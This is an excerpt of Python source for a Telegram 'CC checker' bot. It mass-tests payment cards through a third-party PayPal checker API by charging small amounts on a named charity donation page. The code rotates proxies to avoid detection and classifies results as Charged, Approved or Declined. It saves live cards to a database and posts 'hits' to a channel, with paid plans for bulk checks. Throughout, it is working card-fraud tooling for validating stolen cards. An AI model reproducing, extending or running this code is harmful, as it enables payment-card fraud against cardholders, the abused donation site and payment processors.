# bot.py - Fixed: Added per-proxy concurrency limiter to solve proxy errors during mass checks
# Added PayPal Gateway Support - FULLY FIXED with correct API response parsing
...
# PayPal API URL
PAYPAL_API_URL = os.getenv("PAYPAL_API_URL", "https://auto-paypal-givewp.vercel.app/chk")

# Default PayPal site URL
DEFAULT_PAYPAL_SITE = "https://mylifebloom.co/donations/support-the-lifebloom-cause/"
...
PP_PER_USER_WORKERS = 30
MPP_PER_USER_WORKERS = 50
...
_PROXY_SEMS = {}
_PROXY_SEMS_LOCK = asyncio.Lock()

async def get_proxy_sem(proxy_url: str):
    """Return a semaphore limiting concurrent usage of a proxy (max 2)."""
    async with _PROXY_SEMS_LOCK:
        if proxy_url not in _PROXY_SEMS:
            _PROXY_SEMS[proxy_url] = asyncio.Semaphore(2)
        return _PROXY_SEMS[proxy_url]
...
def get_user_sem(uid, sem_type="msp"):
    ...
    if key not in _USER_SEMS:
        limits = {
            ...
            "pp": PP_PER_USER_WORKERS,
            "mpp": MPP_PER_USER_WORKERS,
...
async def get_user_http_session(uid, purpose="general"):
    ...
    if session is None or session.closed:
        if purpose in ("rz", "mrz"):
            timeout_val = RZ_TIMEOUT
        elif purpose in ("pp", "mpp"):
            timeout_val = PP_TIMEOUT
        else:
            timeout_val = API_TIMEOUT
...
SITE_ERROR_KEYWORDS = [
    ...
    'merchandise_product_not_published_in_buyer_location',
    'WAITING_PENDING_TERMS', 'waiting_pending_terms',
    'InventoryReservationFailure', 'inventoryreservationfailure',
    'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED', 'delivery_delivery_line_detail_changed',
    'MERCHANDISE_PRODUCT_NOT_PUBLIC', 'merchandise_product_not_public',
    'PAYMENTS_INVALID_GATEWAY_FOR_I', 'payments_invalid_gateway_for_i',
    'PAYMENTS_INVALID_GATEWAY', 'payments_invalid_gateway',
    'MERCHANDISE_NOT_ENOUGH_STOCK', 'merchandise_not_enough_stock',
    'MERCHANDISE_LINE_ITEM_NOT_PURCHASABLE', 'merchandise_line_item_not_purchasable',
    'CHECKOUT_CART_LINE_ITEM_LIMIT_REACHED', 'checkout_cart_line_item_limit_reached',
    'PAYMENTS_CREDIT_CARD_BASE_BIN', 'PAYMENTS_CREDIT_CARD_BASE_BRAND_NOT_SUPPORTED',
    'payments_credit_card_base_brand_not_supported', 'SHIPPING_LINE_REQUIRED',
    'shipping_line_required', 'INVALID_CART_ATTRIBUTE', 'invalid_cart_attribute',
    'DISCOUNT_CODE_NOT_FOUND', 'discount_code_not_found', 'DISCOUNT_CODE_ALREADY_APPLIED',
    'discount_code_already_applied', 'GIFT_CARD_NOT_FOUND', 'gift_card_not_found',
    'CUSTOMER_DISABLED', 'customer_disabled', 'SHOP_POLICY_VIOLATION', 'shop_policy_violation',
    'ORDER_MINIMUM_NOT_MET', 'order_minimum_not_met', 'ORDER_MAXIMUM_EXCEEDED',
    'order_maximum_exceeded', 'PRODUCT_NOT_AVAILABLE_IN_QUANTITY', 'product_not_available_in_quantity',
    'INVALID_SHIPPING_ADDRESS', 'invalid_shipping_address', 'INVALID_BILLING_ADDRESS',
    'invalid_billing_address', 'TAX_CALCULATION_FAILED', 'tax_calculation_failed',
    'CURRENCY_NOT_SUPPORTED', 'currency_not_supported', 'SHOPIFY_CHECKOUT_PROTECTION',
    'shopify_checkout_protection', 'BOT_DETECTED', 'bot_detected', 'RATE_LIMITED',
    'rate_limited', 'Error Processing Card: 503', 'Service Unava', 'DECISION_RULE_BLOCK',
    ...
    'No valid payment method found', 'r4 token empty', 'payment method is not shopify',
    'r2 id empty', 'product id is empty', 'py id empty', 'clinte token', 'receipt_empty',
    'receipt id is empty', 'receipt empty', 'site requires login', 'failed to get token',
    'no valid products', 'not shopify', 'failed to get checkout', 'failed to detect product',
    'failed to create checkout', 'failed to get proposal data', 'site not supported',
    'site error! status: 429', 'token not found', 'handle is empty', 'payment method identifier is empty',
    'failed to get session token', 'failed to tokenize card', 'no_session_token', 'no session token',
    'no checkout token found', 'checkout token not found', 'no checkout token', 'checkout token is empty',
    'tokenize_fail', 'tokenize fail', 'tax ammount empty', 'tax amount empty', 'tax amount is empty',
    ...
    'payment method not available', 'Payment method not available', 'no valid payment method found',
    'No valid payment method found', 'payment method not found', 'payment method unavailable',
    'payment method not supported', 'no payment methods available', 'delivery_no_delivery_strategy',
    'DELIVERY_NO_DELIVERY_STRATEGY', 'delivery_strategy_conditions', 'DELIVERY_STRATEGY_CONDITIONS',
    'delivery_strategy_conditions_1', 'DELIVERY_STRATEGY_CONDITIONS_1', 'no shipping methods available',
    'delivery not available', 'delivery_company_required', 'DELIVERY_COMPANY_REQUIRED',
    'delivery_address_required', 'cannot ship to this address', 'delivery_address2_required',
    'delivery_line_detail_changed', 'delivery_line', 'delivery_address', 'address_required',
    'submit_rejected', 'submit rejected:', 'shipping method not available', 'DELIVERY_COMPANY_REQUEST',
    'payments_credit_card_base_exp', 'PAYMENTS_CREDIT_CARD_BASE_EXP', 'payments_credit_card_base_cvv',
    'PAYMENTS_CREDIT_CARD_BASE_CVV', 'payments_credit_card_base_number', 'PAYMENTS_CREDIT_CARD_BASE_NUMBER',
    'payments_positive_amount_expected', 'PAYMENTS_POSITIVE_AMOUNT_EXPECTED', 'payments_payment_flexibility_token',
    'PAYMENTS_PAYMENT_FLEXIBILITY_TOKEN', 'buyer_identity_presentment_currency',
    'BUYER_IDENTITY_PRESENTMENT_CURRENCY', 'inventory_reservation_failure', 'INVENTORY_RESERVATION_FAILURE',
    'payments_positive_amount_expec', 'payments_payment_flexibility_t', 'payments_credit_card_brand_not',
    'checkout is disabled', 'checkout not available for this store', 'checkout is locked',
    'checkout limit reached', 'checkout is not active', 'cart could not be created', 'checkout token expired',
    'checkout session expired', 'checkout is already completed', 'checkout is already paid',
    'shopify checkouts are unavailable', 'checkout not found', 'checkout expired', 'checkout token empty',
    'failed to get checkout url', 'checkout creation failed', 'checkout id is empty', 'checkout is null',
    'shop is currently unavailable', 'store is currently unavailable', 'this shop is currently unavailable',
    'this store is currently unavailable', 'shop is unavailable', 'store is unavailable', 'shop closed',
    'store closed', 'this store is private', 'store not found', 'page not found', 'store is password protected',
    'enter store using password', 'storefront is password protected', 'password protected',
    'closed for maintenance', 'under maintenance', 'site error! status: 400', 'site error! status: 401',
    'site error! status: 403', 'site error! status: 404', 'site error! status: 408', 'site error! status: 429',
    'site error! status: 500', 'site error! status: 501', 'site error! status: 502', 'site error! status: 503',
    'site error! status: 504', 'site error! status: 505', 'site error! status: 520', 'site error! status: 521',
    'site error! status: 522', 'site error! status: 523', 'site error! status: 524', 'site error! status: 525',
    'site error! status: 526', 'site error! status: 527', 'site error! status: 530', 'http 400', 'http 401',
    'http 403', 'http 404', 'http 408', 'http 429', 'http 500', 'http 502', 'http 503', 'http 504',
    'http 520', 'http 521', 'http 522', 'http 523', 'http 524', 'http 525', 'bad gateway',
    'service unavailable', 'gateway timeout', 'internal server error', 'connection refused',
    'connection closed', 'connection reset by peer', 'connection aborted', 'connection timeout',
    'connection timed out', 'network is unreachable', 'host is unreachable', 'no route to host',
    'connection error', 'connection failed', 'timed out', 'timeout', 'could not resolve host',
    'connect tunnel failed', 'unreachable', 'network error', 'connection reset', 'empty reply from server',
    'tlsv1 alert', 'ssl routines', 'openssl ssl_connect', 'api_timeout', 'http error', 'httperror',
    'httperror504', 'httperror502', 'httperror503', 'cannot connect to host', 'failed to establish connection',
    'connection pool error', 'max retries exceeded with url', 'ssl certificate error', 'ssl handshake failed',
    'ssl error', 'tls connection failed', 'certificate verify failed', 'self signed certificate',
    'expired certificate', 'remote host closed connection', 'broken pipe', 'ssl: certificate_verify_failed',
    'tlsv1 unrecognized name', 'wrong version number', 'decryption failed', 'bad record mac',
    'dns lookup failed', 'dns resolution failed', 'dns error', 'cannot resolve host', 'hostname not found',
    'no address associated', 'name resolution failed', 'getaddrinfo failed', 'dns server not responding',
    'dns query failed', 'temporary failure in name resolution', 'rate limit exceeded', 'too many requests',
    'request was throttled', 'detected unusual activity', 'automated request detected', 'bot protection enabled',
    'access denied due to bot activity', 'blocked by robots.txt', 'challenge required', 'hcaptcha detected',
    'hcaptcha_detected', 'captcha at checkout', 'captcha_required', 'captcha required', 'cloudflare',
    'access denied', 'permission denied', 'access forbidden', 'forbidden access', 'blocked by cloudflare',
    'ddos protection', 'browser check', 'checking your browser', 'just a moment', 'ray id:', 'cf-ray:',
    'cf-chl-bypass', 'unexpected end of json', 'json decode error', 'json parse error', 'cannot unmarshal',
    'malformed response', 'invalid character', 'invalid json response', 'invalid json', 'json.decoder.jsondecodeerror',
    'expecting value', 'extra data', 'unterminated string', 'site error', 'site dead', 'site errors',
    'server error', 'internal_server_error', 'application error', 'unexpected error', 'something went wrong',
    'error in 1st req', 'error in 1 req', 'all sites dead', 'all sites unavailable', 'processinf error',
    'handle error', 'nonetype', "nonetype' object has no attribute 'get", 'unknown error', 'unknown_error',
    'unknown_result', 'utm_source', 'change proxy or site', 'change site', 'fake charge gate', 'fake gate',
    'amount_too_small', 'amount too small', 'product out of stock', 'malformed input', 'url rejected',
    'invalid_response', 'cart failed with status', 'cookie disabled', 'session cookie not found',
    'session creation failed', 'no valid session', 'session not found', 'session expired', 'session invalid',
    'failed to get session', 'session token missing', 'invalid session', 'redirect loop detected',
    'too many redirects', 'redirection error', 'max redirects exceeded', 'infinite redirect', "'products'",
    "error:", "error: '", 'cart add failed', 'cart is empty', "'errors'", '"errors"', '{"errors":',
    'errors":{', 'unauthenticated', 'unauthorized', 'invalid api key', 'access token invalid', 'throttled',
    'shop is frozen', 'store is frozen', 'shop has been frozen', 'api limit exceeded', 'quota exceeded',
    'usage limit reached', 'request too large', 'payload too large', 'entity too large', 'failed after retries',
    'max retries exceeded', 'retry limit exceeded', 'temporary failure', 'try again later', 'please try again',
    'internal error', 'system error', 'fatal error', 'critical error', 'ARTIFACT_DISSATISFACTION',
    'artifact_dissatisfaction', 'TAX_NEW_TAX_MUST_BE_ACCEPTED', 'tax_new_tax_must_be_accepted',
    'PROCESSING_ERROR', 'processing_error', 'decision_rule_block', 'unable to get payment token',
    'empty submit response', 'empty submit', 'order_total_changed', 'order total changed',
    'invalid_payment_method', 'invalid payment method', 'validation_custom', 'validation custom',
    'payment provider error', 'payment gateway error', 'payment processor error', 'error processing card',
    'we could not process', 'unable to process',
]
...
# PayPal specific error keywords
PP_RETRY_KEYWORDS = [
    'timeout', 'timed out', 'connection error', 'connection failed',
    'connection reset', 'server error', 'internal server error',
    '502', '503', '504', '500', 'bad gateway', 'service unavailable',
    'gateway timeout', 'empty reply', 'invalid json', 'could not resolve host',
    'network error', 'unreachable', 'proxy dead', 'proxy error',
    'proxy timeout', 'rate limited', 'too many requests', '429',
    'retry after', 'temporary error', 'try again later', 'please try again',
    'server busy', 'overloaded', 'downstream error', 'upstream error',
    'gateway error', 'connection pool timeout', 'request timeout',
    'read timeout', 'write timeout', 'connect timeout', 'dns error',
]

# Card-level retry keywords
CARD_RETRY_KEYWORDS = [
    'timeout', 'timed out', 'connection error', 'connection failed',
    'connection reset', 'server error', 'internal server error',
    '502', '503', '504', '500', 'bad gateway', 'service unavailable',
...
def is_pp_retry_error(text):
    """Check if PayPal error is retryable"""
    if not text:
        return True
    lower = text.lower().strip()
    return any(kw in lower for kw in PP_RETRY_KEYWORDS)
...
def is_site_truly_dead(response, price):
    ...
    exact_dead = [
        'MERCHANDISE_PRODUCT_NOT_PUBLISHED_IN_BUYER_LOCATION',
        'WAITING_PENDING_TERMS', 'INVENTORYRESERVATIONFAILURE',
        ...
        'SHIPPING_LINE_REQUIRED', 'INVALID_CART_ATTRIBUTE',
        'DISCOUNT_CODE_NOT_FOUND', 'DISCOUNT_CODE_ALREADY_APPLIED',
        'GIFT_CARD_NOT_FOUND', 'CUSTOMER_DISABLED', 'SHOP_POLICY_VIOLATION',
        'ORDER_MINIMUM_NOT_MET', 'ORDER_MAXIMUM_EXCEEDED',
        'PRODUCT_NOT_AVAILABLE_IN_QUANTITY', 'INVALID_SHIPPING_ADDRESS',
        'INVALID_BILLING_ADDRESS', 'TAX_CALCULATION_FAILED',
        'CURRENCY_NOT_SUPPORTED', 'SHOPIFY_CHECKOUT_PROTECTION',
        'BOT_DETECTED', 'RATE_LIMITED', 'MERCHANDISE_PRODUCT_NOT_PUBLIC',
        'PAYMENTS_INVALID_GATEWAY_FOR_I', 'PAYMENTS_INVALID_GATEWAY',
        'CHECKOUT_NOT_FOUND', 'PAGE_NOT_FOUND', 'STORE_NOT_FOUND',
        'PRODUCT_NOT_FOUND', 'NO_PRODUCT_FOUND', 'CART_IS_EMPTY',
        'CHECKOUT_DISABLED', 'MERCHANDISE_NOT_ENOUGH_STOCK',
        'DECISION_RULE_BLOCK', 'PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH',
        'INVALID_PAYMENT_METHOD', 'MERCHANDISE_OUT_OF_STOCK', 'VALIDATION_CUSTOM',
    ...
    dead_indicators = [
        'merchandise_product_not_public', 'payments_invalid_gateway',
        'payments_invalid_gateway_for_i', 'merchandise_not_enough_stock',
        ...
        'payments_payment_flexibility_token', 'buyer_identity_presentment_currency',
        'inventory_reservation_failure', 'inventoryreservationfailure',
        'payment method not available', 'no valid payment method found',
        'payment method not found', 'payment method unavailable',
        'payment method not supported', 'no payment methods available',
        'checkout is disabled', 'checkout not available', 'checkout not available for this store',
        'checkout is locked', 'checkout limit reached', 'checkout is not active',
        'checkout not found', 'checkout expired', 'checkout token empty',
        'checkout token not found', 'checkout token is empty', 'checkout is already completed',
        'checkout is already paid', 'checkout creation failed', 'checkout id is empty',
        'checkout is null', 'cart is empty', 'cart could not be created',
        'cart add failed after retries', 'cart add failed', 'no product found',
        'product out of stock', 'product not found', 'no valid products',
        'product id is empty', 'r2 id empty', 'py id empty', 'failed to get token',
        'token not found', 'no_session_token', 'no session token', 'no checkout token found',
        'failed to get session token', 'failed to tokenize card', 'tokenize_fail',
        'tokenize fail', 'r4 token empty', 'clinte token', 'store is currently unavailable',
        'this store is currently unavailable', 'store is unavailable', 'shop is currently unavailable',
        'this shop is currently unavailable', 'shop is unavailable', 'shop closed',
        'store closed', 'this store is private', 'store not found', 'page not found',
        'store is password protected', 'enter store using password', 'storefront is password protected',
        'password protected', 'closed for maintenance', 'under maintenance', 'shop is frozen',
        'store is frozen', 'shop has been frozen', 'delivery_no_delivery_strategy',
        'delivery_strategy_conditions', 'delivery_strategy_conditions_1', 'no shipping methods available',
        'delivery not available', 'delivery_company_required', 'delivery_address_required',
        'cannot ship to this address', 'delivery_delivery_line_detail_changed',
        'delivery_address2_required', 'delivery_line_detail_changed', 'delivery_line',
        'delivery_address', 'address_required', 'submit_rejected', 'shipping method not available',
        ...
        'tls connection failed', 'certificate verify failed', 'dns lookup failed',
        'dns resolution failed', 'dns error', 'cannot resolve host', 'hostname not found',
        'name resolution failed', 'getaddrinfo failed', 'rate limit exceeded',
        'too many requests', 'request was throttled', 'detected unusual activity',
        'bot protection enabled', 'captcha required', 'cloudflare', 'access denied',
        'blocked by cloudflare', 'ddos protection', 'just a moment', 'ray id:', 'cf-ray:',
        'invalid json', 'json decode error', 'json parse error', 'site error',
        'site dead', 'server error', 'internal_server_error', 'unexpected error',
        'something went wrong', 'nonetype', 'unknown error', 'unable to process',
        'payment provider error', 'payment gateway error', 'checkout_expired',
        'receipt_empty', 'receipt id is empty', 'site requires login', 'failed to get checkout',
        'error processing card', 'decision_rule_block', 'validation_custom', 'invalid_payment_method',
    ]
...
def format_pp_single_result(status, card, gateway, response, bin_info=None, elapsed=0.0, amount="5.00"):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
...
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>{bs('Amount')}</b> ━ <code>${amount}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>
...
async def check_card_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=3, rotator=None, cancel_check=None, http_session=None):
    ...
    for attempt in range(max_retries):
        ...
        if proxy_data:
            ...
            sem = await get_proxy_sem(proxy_url)
            async with sem:
...
# ====================== PAYPAL API (FIXED - Properly detects APPROVED status) ======================
def build_pp_api_url(card, site_url, amount="5.00", proxy_data=None):
    """
    Build PayPal API URL
    Format: https://auto-paypal-givewp.vercel.app/chk?url={site_url}&card={card}&amount={amount}
    """
    if not site_url.startswith(('http://', 'https://')):
        site_url = f'https://{site_url}'
    
    url = f'{PAYPAL_API_URL}?url={quote(site_url, safe="")}&card={quote(card, safe="")}&amount={amount}'
...
def classify_pp_response(response_data):
    """
    Classify PayPal API response into Charged/Approved/Declined/Error
    Response format from API: 
    {
        "Coded by": "@aiojames",
        "card": "4414511463173656",
        "gateway": "PAYPAL $1.00",
        "response": "Invalid card format: Invalid card format",
        "status": "DECLINED ❌",
        "success": "false",
        "time": 0.0
    }
    ...
    if not response_data:
        return {"Response": "Empty response", "Gateway": gate, "Status": "Error"}
    
    # Extract fields from response
    success = str(response_data.get('success', 'false')).lower()
    status_text = str(response_data.get('status', ''))
    response_msg = str(response_data.get('response', ''))
    gateway_info = str(response_data.get('gateway', 'PayPal'))
    
    # Extract amount from gateway field (e.g., "PAYPAL $1.00" -> "1.00")
    amount_match = re.search(r'\$(\d+(?:\.\d+)?)', gateway_info)
    amount = amount_match.group(1) if amount_match else "5.00"
    
    # Full response for display
    full_response = f"{status_text} | {response_msg}" if status_text and response_msg else response_msg or status_text or "No response"
    
    # Clean response - remove emoji characters for better display
    clean_full_response = re.sub(r'[^\x00-\x7F]+', '', full_response).strip()
    
    # Check if status indicates APPROVED (contains APPROVED or VALIDATION ERROR or Card is LIVE)
    status_upper = status_text.upper()
    response_upper = response_msg.upper()
    
    # APPROVED detection
    if 'APPROVED' in status_upper or 'VALIDATION ERROR' in response_upper or 'CARD IS LIVE' in response_upper:
        return {"Response": clean_full_response[:200], "Gateway": gate, "Status": "Approved", "amount": amount}
    
    # CHARGED detection (success true and status indicates success)
    if success == 'true':
        if any(word in status_upper for word in ['CHARGED', 'SUCCESS', 'CAPTURED', 'COMPLETED']):
            return {"Response": clean_full_response[:200], "Gateway": gate, "Status": "Charged", "amount": amount}
        else:
            return {"Response": clean_full_response[:200], "Gateway": gate, "Status": "Approved", "amount": amount}
    
    # DECLINED detection
    declined_keywords = [
        'DECLINED', 'INVALID', 'FAILED', 'CANCELLED', 'CARD_DECLINED',
        'INSUFFICIENT', 'EXPIRED', 'STOLEN', 'LOST', 'RESTRICTED', 'FRAUD',
        'RISK_DISALLOWED', 'CARD_GENERIC_ERROR', 'ISSUER_DECLINE',
        'GUEST_CARD_COUNTRY_MISMATCH', 'DO_NOT_HONOR', 'NOT_PERMITTED'
    ]
    
    for kw in declined_keywords:
        if kw in status_upper or kw in response_upper:
            return {"Response": clean_full_response[:200], "Gateway": gate, "Status": "Declined", "amount": amount}
    
    # ERROR detection (retryable)
    error_keywords = [
        'TIMEOUT', 'CONNECTION', 'SERVER ERROR', 'UNAVAILABLE', 'RATE LIMIT',
        'TOO MANY', 'PROXY', 'HTTP_500', 'HTTP_502', 'HTTP_503', 'HTTP_504',
        '403', 'FORBIDDEN', 'BLOCKED'
    ]
    
    for kw in error_keywords:
        if kw in status_upper or kw in response_upper:
            return {"Response": clean_full_response[:200], "Gateway": gate, "Status": "Error", "amount": amount}
...
async def check_pp_api(card, site_url, amount="5.00", proxy_data=None, user_id=None, http_session=None):
    """Check card via PayPal API with correct response parsing"""
    uid = user_id or "?"
    try:
        ...
        url = build_pp_api_url(card, site_url, amount, proxy_data)
        s = http_session or (await get_user_http_session(uid, "pp"))
        
        async with s.get(url, timeout=aiohttp.ClientTimeout(total=PP_TIMEOUT)) as r:
            if r.status == 403:
                return {"Response": "HTTP_403: Site may be blocked or invalid. Try a different site URL", "Gateway": "PayPal", "Status": "Error", "card": card, "site": site_url, "amount": amount}
            elif r.status != 200:
                return {"Response": f"HTTP_{r.status}: API Error", "Gateway": "PayPal", "Status": "Error", "card": card, "site": site_url, "amount": amount}
            
            try:
                response_data = await r.json(content_type=None)
            except Exception as json_err:
                response_text = await r.text()
                return {"Response": f"Invalid JSON: {response_text[:100]}", "Gateway": "PayPal", "Status": "Error", "card": card, "site": site_url, "amount": amount}
        
        result = classify_pp_response(response_data)
        result["card"] = card
        result["site"] = site_url
        result["amount"] = result.get("amount", amount)
        return result
        
    except asyncio.TimeoutError:
        return {"Response": "Timeout - API took too long to respond", "Gateway": "PayPal", "Status": "Error", "card": card, "site": site_url, "amount": amount}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {"Response": f"Connection Error: {str(e)[:80]}", "Gateway": "PayPal", "Status": "Error", "card": card, "site": site_url, "amount": amount}


async def check_pp_with_retry(card, site_url, proxies_data=None, user_id=None, max_retries=3, amount="5.00", cancel_check=None, http_session=None):
    """Check card via PayPal with retry logic"""
    tried_proxies = set()
    last = None
    
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Gateway": "PayPal", "Status": "Error", "card": card, "amount": amount}
        ...
        if proxy_data:
            ...
            sem = await get_proxy_sem(proxy_url)
            async with sem:
                result = await check_pp_api(card, site_url, amount, proxy_data, user_id, http_session=http_session)
        else:
            result = await check_pp_api(card, site_url, amount, proxy_data, user_id, http_session=http_session)
        
        resp_text = result.get("Response", "")
        is_retryable = is_pp_retry_error(resp_text) or result.get("Status") == "Error"
        
        if not is_retryable or result.get("Status") in ["Charged", "Approved"]:
            return result
    ...
    if last:
        if is_pp_retry_error(last.get("Response", "")):
            last["Status"] = "Error"
        return last
    return {"Response": "Max retries", "Gateway": "PayPal", "Status": "Error", "card": card, "amount": amount}
...
<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
        elif gate_type == "PayPal":
            amount = res.get('amount', '5.00')
            msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
<b>{bs('Gateway')} ➛ {gw}</b>
<b>{bs('Response')} ➛ {resp}</b>
<b>{bs('Amount')} ➛ ${amount}</b>
<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
        else:
            msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
<b>{bs('Gateway')} ➛ {gw}</b>
...
{PE} <b><i>{bs('PayPal')}</i></b>
|   {PE} <code>/pp</code> ━ <b>{bs('Single CC')}</b>
|   {PE} <code>/mpp</code> ━ <b>{bs('Mass CC')}</b>
...
# ====================== /pp (PayPal Single) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]pp\b'))
async def pp_single_check(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    ...
    # First parameter after /pp should be site URL
    if len(parts) >= 2:
        potential_site = parts[1]
        if is_valid_url_or_domain(potential_site):
            site_url = potential_site
            remaining = ' '.join(parts[2:]) if len(parts) > 2 else ''
            cards = extract_cc(remaining)
            if cards:
                card = cards[0]
        else:
    ...
    # If no site URL in command, check reply message
    if not site_url:
        rm = await event.get_reply_message() if event.reply_to_msg_id else None
        if rm and rm.text:
            extracted_sites = extract_urls_from_text(rm.text)
            if extracted_sites:
                site_url = extracted_sites[0]
            card = _get_card_from_event(event, rm)
    
    # Use default site if still no site URL
    if not site_url:
        site_url = DEFAULT_PAYPAL_SITE
    
    # If no card, check for card in command
    if not card:
        card = _get_card_from_event(event, None)
        if not card and len(parts) >= 2:
            cards = extract_cc(' '.join(parts[1:]))
            if cards:
                card = cards[0]
    
    if not card:
        return await styled_reply(event, f"{PE} <b>{bs('Card Required')}</b>\n{PE} <code>/pp {site_url} card|mm|yy|cvv</code>", emoji_ids=[CE["cross"]])
    
    if uid not in ADMIN_ID and not is_paid_plan(plan): 
        set_free_sp_last_use(uid)
        increment_free_sp_usage(uid)
    
    lm = await styled_reply(event, f"{bs('Processing PayPal')}… ⏳")
    st = time.time()
    
    try:
        http_session = await get_user_http_session(uid, "pp")
        bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
        
        async with get_user_sem(uid, "pp"):
            result = await check_pp_with_retry(card, site_url, proxies, uid, max_retries=3, amount=amount, http_session=http_session)
        
        bi = await bin_task
        elapsed = round(time.time() - st, 2)
        status = result.get('Status', 'Declined')
        resp_amount = result.get('amount', amount)
        
        if status in ["Charged", "Approved"]:
            asyncio.create_task(save_card_to_db(card, status.upper(), result.get('Response', ''), 'PayPal', resp_amount))
        
        msg, eid = format_pp_single_result(status, card, 'PayPal', result.get('Response', '')[:150], bi, elapsed, amount=resp_amount)
        ...
        if status == "Charged":
            ...
            result_with_amount["amount"] = resp_amount
            asyncio.create_task(send_channel_hit(result_with_amount, uid, username, name, "PayPal"))
...
async def stop_cmd(event):
    uid = event.sender_id
    stopped_any = False
    for store in [ACTIVE_MTXT_PROCESSES, ACTIVE_MRZ_PROCESSES, ACTIVE_MPP_PROCESSES]:
        proc = store.get(uid)
...
# ====================== GENERIC MASS PROCESSOR WITH ERROR COUNT ======================
async def _run_mass_process(event, cards, proxies, send_approved, process_store, stop_prefix, check_func, gate_name, sem_type):
    ...
    workers = MPP_PER_USER_WORKERS if sem_type == "mpp" else (MRZ_PER_USER_WORKERS if sem_type == "mrz" else MSP_PER_USER_WORKERS)
    user_sem = get_user_sem(uid, sem_type)
    http_session = await get_user_http_session(uid, sem_type)
    is_rz = gate_name == "RazorPay"
    is_pp = gate_name == "PayPal"
    ...
    async def worker(card):
        ...
        async with user_sem:
            ...
            try:
                ...
                price = result.get("Price", "-") if not is_pp else result.get("amount", "5.00")
                checked += 1
                lcd = card
                lrd = resp[:30]
                ...
                if status == "Error": 
                    ...
                    detailed_results.append(detail)
                    asyncio.create_task(save_card_to_db(card, "CHARGED", resp, gw, str(price)))
                    asyncio.create_task(_send_mass_hit(card, result, status, uid, username, name, is_rz or is_pp, is_pp))
                elif status == "Approved":
                    approved += 1
                    detail["result_type"] = "APPROVED"
                    detailed_results.append(detail)
                    asyncio.create_task(save_card_to_db(card, "APPROVED", resp, gw, str(price)))
                    if send_approved:
                        asyncio.create_task(_send_mass_hit(card, result, status, uid, username, name, is_rz or is_pp, is_pp))
                else: 
                    declined += 1
...
async def _send_mass_hit(card, result, status, uid, username, name, is_rz=False, is_pp=False):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        gw = result.get('Gateway', 'RazorPay' if is_rz else ('PayPal' if is_pp else 'Shopify'))
        resp = result.get('Response', '')[:150]
        if is_rz or is_pp:
            if is_pp:
                amount = result.get('amount', '5.00')
                msg, eid = format_pp_single_result(status, card, gw, resp, bi, 0.0, amount)
            else:
        ...
        try: 
            ...
            pass
        if status == "Charged":
            asyncio.create_task(send_channel_hit(result, uid, username, name, "RazorPay" if is_rz else ("PayPal" if is_pp else "Shopify")))
    except: 
        pass
...
# ====================== /mpp (PayPal Mass) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]mpp\b'))
async def mpp_mass_check_cmd(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    ...
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        return await send_premium_only_message(event)
    cl = get_cc_limit(plan, uid)
    if uid in ACTIVE_MPP_PROCESSES: 
        return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
    
    content, from_inline = "", False
    site_url = None
    cmd_text = re.sub(r'^[/.]mpp\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    
    parts = cmd_text.split()
    if parts and is_valid_url_or_domain(parts[0]):
        site_url = parts[0]
        ...
        return await styled_reply(event, f"""{PE} <b>{bs('Usage')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <code>/mpp site.com</code> {bs('and reply to .txt or paste cards')}

{PE} <b>{bs('Example')}:</b>
{PE} <code>/mpp mylifebloom.co</code> {bs('then reply with card file')}

{PE} <b>{bs('OR')}</b>
{PE} <code>/mpp mylifebloom.co card1|mm|yy|cvv card2|mm|yy|cvv</code>

{PE} <i>{bs('Default site for PayPal')}:</i>
{PE} • <code>{DEFAULT_PAYPAL_SITE}</code>""", emoji_ids=[CE["info"], CE["info"], CE["link"], CE["globe"]])
    
    if not site_url:
        site_url = DEFAULT_PAYPAL_SITE
    
    if not content and event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if rm:
            if rm.document:
                fp = await rm.download_media()
                try:
                    ...
                    pass
            elif rm.text and not site_url:
                content = rm.text
    elif not content and not event.reply_to_msg_id and cmd_text:
        if not content and len(parts) > 1:
            content = ' '.join(parts[1:]) if site_url != DEFAULT_PAYPAL_SITE else cmd_text
    
    cards = extract_cc(content)
    if not cards:
        return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>\n{PE} {bs('Reply to a .txt file or paste cards after the command')}", emoji_ids=[CE["cross"]])
    
    if len(cards) > cl:
        cards = cards[:cl]
    
    await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('PayPal')} | {bs('Site')}: {site_url} | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
    
    proxies = await get_all_user_proxies(uid)
    
    async def pp_check(card, http_session):
